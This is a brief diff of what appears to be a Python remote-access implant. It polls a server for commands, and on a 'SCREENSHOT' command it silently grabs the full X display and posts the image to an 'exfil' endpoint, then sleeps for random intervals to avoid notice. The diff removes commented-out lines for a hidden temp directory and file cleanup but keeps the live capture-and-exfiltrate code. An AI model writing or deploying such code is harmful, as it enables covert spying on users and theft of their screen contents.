@@ -69,12 +69,7 @@ if __name__ == "__main__":
                 exit()
             elif serverText["command"] == "SCREENSHOT":
                 fileName = str(time.time()) + ".xwd"
- #               tempDir = "/tmp/." + ''.join(random.choice(string.ascii_letters) for i in range(15))
-#                os.popen("mkdir " + tempDir)
                 image = subprocess.Popen("xwd -silent -root -display :0.0", shell=True, stdout = subprocess.PIPE).communicate()[0]
-               # print(image + "DONE")
- #               os.popen("xwd -out " + tempDir + "/" + fileName + " -root -display :0.0")
                 httpPost("exfil", image, "")
-  #              os.popen("rm -rf " + tempDir + "/" + fileName)
 
         time.sleep(random.randint(LOW_TIME,HIGH_TIME))
